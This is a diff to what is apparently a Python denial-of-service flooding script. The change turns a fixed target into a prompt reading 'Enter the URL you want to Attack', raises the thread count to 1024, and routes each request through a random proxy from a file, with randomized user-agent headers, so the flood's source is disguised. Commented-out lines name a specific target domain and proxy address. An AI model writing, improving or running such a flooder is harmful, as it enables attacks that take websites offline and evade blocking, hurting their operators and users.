@@ -16,19 +16,28 @@ def random_user_agent():
     }
     return headers
 
-# url=input("Enter the URL you want to Attack:")
+url=input("Enter the URL you want to Attack:")
 # Thread =int(input("Enter the No: of Threads:"))
-url = "https://centinels.zeal.ninja/"
-Thread = 10
+# url = "http://ipinfo.io/json"
+# url = "https://centinels.zeal.ninja/"
+Thread = 1024
+valied_proxy=[]
+
+with open("ValidProxy.txt","r") as f:
+    valied_proxy = f.read().split("\n")
 
 def send_req(url):
-#     proxy = {
-#     'http': 'http://115.96.208.124:8080',
-#     'https': 'https://1115.96.208.124:8080'
-# }
+
+    int = random.randint(0,len(valied_proxy) -1)
+    proxy = {
+    'http': valied_proxy[int],
+    'https': valied_proxy[int]
+}
      
     try:
-     res = requests.get(url, headers=random_user_agent())
+    #  print(proxy)
+     res = requests.get(url, headers=random_user_agent(),proxies=proxy)
+    #  print(res.json())
     except Exception as e:
         print(f"Error making request to {url}: {e}")  
 
